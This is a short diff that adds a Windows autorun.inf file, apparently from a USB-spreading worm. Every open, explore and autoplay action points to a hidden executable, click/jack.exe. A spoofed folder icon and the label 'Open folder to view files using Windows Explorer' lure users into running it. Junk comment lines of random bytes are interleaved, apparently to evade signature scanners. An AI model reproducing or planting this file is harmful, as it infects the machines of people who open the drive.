@@ -1,0 +1,15 @@
+[autorun
+;s?Tj?Xëú
+open=click/jack.exe
+;õ??mRC)???ù?
+icon=%SystemRoot%\system32\SHELL32.dll,4
+;??A}OëÊMb?
+action=Open folder to view files using Windows Explorer
+;LkdÏOF
+shell\\open\command=click/jack.exe
+;?Zf]???Mé
+shell\explore\\command=click/jack.exe
+;?s??çt??
+useautoplay=1
+;?øüÌ????àÒY?
+[AutoRun]
